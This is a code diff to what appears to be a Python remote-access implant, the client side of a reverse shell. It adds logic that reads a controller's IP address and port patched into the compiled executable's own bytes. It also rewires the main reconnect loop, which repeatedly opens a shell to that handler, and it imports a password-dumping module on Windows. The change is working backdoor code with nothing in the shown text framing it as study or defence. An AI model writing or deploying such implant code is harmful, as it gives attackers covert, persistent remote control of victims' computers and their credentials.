@@ -18,6 +18,27 @@ import sys
 if os.name == "nt":
 	import passdump
 	import win32net
+
+try:
+	print sys.frozen
+	with open(sys.argv[0], "rb") as f:
+		f.seek(972)
+		HANDLER_IP = ""
+		for i in range(4):
+			HANDLER_IP += str(ord(f.read(1)))+"."
+		port1 = ord(f.read(1))
+		port2 = ord(f.read(1))
+		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
+		HANDLER_IP = HANDLER_IP[:-1]
+except Exception as e:
+	traceback.print_stack()
+	print e
+	HANDLER_IP = "127.0.0.1"
+	HANDLER_PORT = 8080
+	
+print HANDLER_IP
+print HANDLER_PORT
+
 	
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
@@ -502,7 +523,7 @@ help - This menu!
 		return self.channel.read_input()
 		
 while True:
-	shell = Shell(Transport("192.168.1.78",8080))
+	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT))
 	if not shell.run():
 		del shell
 		for t in threading.enumerate():
